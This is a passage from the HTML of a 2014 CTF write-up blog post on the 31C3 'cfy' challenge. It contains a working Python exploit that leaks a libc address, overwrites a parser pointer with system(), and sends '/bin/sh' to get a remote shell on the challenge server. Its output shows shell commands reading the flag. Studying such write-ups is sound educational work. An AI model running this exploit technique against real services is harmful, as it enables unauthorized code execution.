+</span><span class='line'><span class="p">[</span><span class="err">!</span><span class="p">]</span> <span class="n">found</span> <span class="n">possible</span> <span class="n">offset</span> <span class="k">for</span> <span class="n">system</span><span class="p">():</span> <span class="n">printf</span><span class="o">-</span><span class="mi">63666</span>
+</span><span class='line'><span class="p">[</span><span class="err">!</span><span class="p">]</span> <span class="n">system</span> <span class="err">@</span> <span class="mh">0x7f4df0086b2e</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>At <code>printf-63665</code>, libc indeed has the first few bytes of <code>system()</code>. It started with a <code>00</code> byte, so I decreased the value by one and plugged that value into a script.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
+</span><span class='line'>
+</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">telnetlib</span><span class="o">,</span> <span class="nn">socket</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;L&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># leak printf address in libc via GOT pointer</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;2</span><span class="se">\n</span><span class="s">&quot;</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x601020</span><span class="p">)</span> <span class="c"># printf@plt</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;188.40.18.73&#39;</span><span class="p">,</span> <span class="mi">3313</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1025</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+</span><span class='line'><span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">PRINTF</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
+</span><span class='line'><span class="k">print</span> <span class="n">data</span>
+</span><span class='line'><span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">r&#39;hex: (.*)&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+</span><span class='line'><span class="k">if</span> <span class="n">m</span><span class="p">:</span>
+</span><span class='line'>  <span class="n">PRINTF</span> <span class="o">=</span> <span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] found printf: </span><span class="si">%x</span><span class="s">&quot;</span> <span class="o">%</span> <span class="nb">int</span><span class="p">(</span><span class="n">PRINTF</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+</span><span class='line'><span class="n">SYSTEM</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">PRINTF</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">63664</span>
+</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] system at </span><span class="si">%x</span><span class="s">&quot;</span> <span class="o">%</span> <span class="nb">int</span><span class="p">(</span><span class="n">SYSTEM</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># spam system into buf</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;1</span><span class="se">\n</span><span class="s">&quot;</span>        
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SYSTEM</span><span class="p">)</span>    <span class="c"># address of system() will be stored in buf</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SYSTEM</span><span class="p">)</span>    <span class="c"># buf+8</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SYSTEM</span><span class="p">)</span>    <span class="c"># buf+16</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;7</span><span class="se">\n</span><span class="s">&quot;</span>        <span class="c"># use an address further into buf (parsers+7*16)</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;/bin/sh</span><span class="se">\n</span><span class="s">&quot;</span>  <span class="c"># because this will overwrite the first few bytes</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>         <span class="c"># send payload, causing it to call system(&#39;/bin/sh&#39;)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>  <span class="c"># interact with spawned shell</span>
+</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
+</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I ran the script and crossed my fingers:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/31c3/cfy<span class="nv">$ </span>python exploit.py
+</span><span class='line'>What <span class="k">do</span> you want to <span class="k">do</span>?
+</span><span class='line'>0<span class="o">)</span> parse from hex
+</span><span class='line'>1<span class="o">)</span> parse from dec
+</span><span class='line'>2<span class="o">)</span> parse from pointer
+</span><span class='line'>3<span class="o">)</span> quit
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Please enter your number: dec: 140686779126752
+</span><span class='line'>hex: 0x7ff4317e93e0
+</span><span class='line'>
+</span><span class='line'>What <span class="k">do</span> you want to <span class="k">do</span>?
+</span><span class='line'>0<span class="o">)</span> parse from hex
+</span><span class='line'>1<span class="o">)</span> parse from dec
+</span><span class='line'>2<span class="o">)</span> parse from pointer
+</span><span class='line'>3<span class="o">)</span> quit
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> found <span class="nb">printf</span>: 7ff4317e93e0
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> system at 7ff4317d9b30
+</span><span class='line'>
+</span><span class='line'>Please enter your number:
+</span><span class='line'>dec: 0
+</span><span class='line'>hex: 0x0
+</span><span class='line'>
+</span><span class='line'>What <span class="k">do</span> you want to <span class="k">do</span>?
+</span><span class='line'>0<span class="o">)</span> parse from hex
+</span><span class='line'>1<span class="o">)</span> parse from dec
+</span><span class='line'>2<span class="o">)</span> parse from pointer
+</span><span class='line'>3<span class="o">)</span> quit
+</span><span class='line'>
+</span><span class='line'>Please enter your number: id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>cfy<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>cfy<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>cfy<span class="o">)</span>
+</span><span class='line'>cat /home/cfy/flag
+</span><span class='line'>THANK YOU WARIO!
+</span><span class='line'>
+</span><span class='line'>BUT OUR PRINCESS IS IN
+</span><span class='line'>ANOTHER CASTLE!
+</span><span class='line'>
+</span><span class='line'>Login: cfy_pwn // 31C3_G0nna_keep&lt;on&gt;grynding
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So the flag was <code>31C3_G0nna_keep&lt;on&gt;grynding</code>. I thought this was quite tough based on the amount of points&hellip;</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">barrebas</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2014-12-29T12:06:07+01:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>29</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>12:06 pm</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/31c3/'>31c3</a>, <a class='category' href='/blog/categories/binary/'>binary</a>, <a class='category' href='/blog/categories/cfy/'>cfy</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://barrebas.github.io/blog/2014/12/29/31c3-ctf-cfy/" data-via="barrebas" data-counturl="http://barrebas.github.io/blog/2014/12/29/31c3-ctf-cfy/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2014/12/27/hackvent-2014-reversing-day-23/" title="Previous Post: Hackvent 2014 - Reversing Day 23">&laquo; Hackvent 2014 - Reversing Day 23</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2014/12/29/31c3-ctf-cfy/">31C3 CTF - Cfy</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/12/27/hackvent-2014-reversing-day-23/">Hackvent 2014 - Reversing Day 23</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/12/27/staring-into-slash-dev-slash-null-weekly-roundup/">Staring Into /dev/null Weekly Roundup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/12/24/advent-ctf-2014-bruteforce/">Advent CTF 2014 - Bruteforce</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/12/24/advent-ctf-2014-shellcodeme/">Advent CTF 2014 - Shellcodeme</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2014 - barrebas -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'barrebas';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://barrebas.github.io/blog/2014/12/29/31c3-ctf-cfy/';
+        var disqus_url = 'http://barrebas.github.io/blog/2014/12/29/31c3-ctf-cfy/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
